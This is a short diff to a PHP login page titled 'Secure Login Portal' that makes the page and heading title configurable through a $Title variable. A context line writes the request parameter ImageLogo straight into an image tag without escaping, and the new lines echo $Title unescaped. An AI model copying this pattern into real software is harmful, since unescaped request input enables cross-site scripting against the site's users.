@@ -275,6 +275,8 @@ h1{
 
 </style>
 
+<title><?php if($Title != ""){echo $Title;}else{echo "Secure Login Portal";} ?></title>
+
 </HEAD>
 <BODY>
 
@@ -285,7 +287,7 @@ h1{
     <!-- Icon -->
     <div class="fadeIn first">
       <?php if(isset($_REQUEST['ImageLogo']) && $_REQUEST['ImageLogo'] != ""){echo "<IMG SRC='".$_REQUEST['ImageLogo']."' WIDTH='300'><BR><BR>";}?>
-      <h1>Secure Login Portal</h1>
+<?php if($Title != ""){echo "<h1>".$Title."</h1>";}else{echo "<h1>Secure Login Portal</h1>";} ?>
     </div>
 
     <!-- Login Form -->
